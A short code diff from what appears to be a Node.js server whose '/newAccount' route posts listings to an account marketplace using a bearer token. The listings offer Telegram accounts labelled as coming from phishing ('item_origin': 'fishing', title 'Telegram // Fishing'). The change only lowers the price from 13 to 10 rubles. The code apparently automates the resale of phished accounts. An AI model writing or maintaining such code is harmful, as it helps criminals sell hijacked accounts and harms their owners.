@@ -112,9 +112,9 @@ app.post("/newAccount", async(req, res) =>
                     "currency": "rub",
                     "item_origin": "fishing",
                     "extended_guarantee": 0,
-                    "price": 13,
-                    "title": "Телеграм // фишинг // 13 рублей",
-                    "title_en": "Telegram // Fishing // 13 rub"
+                    "price": 10,
+                    "title": "Телеграм // фишинг // 10 рублей",
+                    "title_en": "Telegram // Fishing // 10 rub"
             }, headers: {"Authorization": `Bearer ${config.lolzToken}`}})
 
             break;
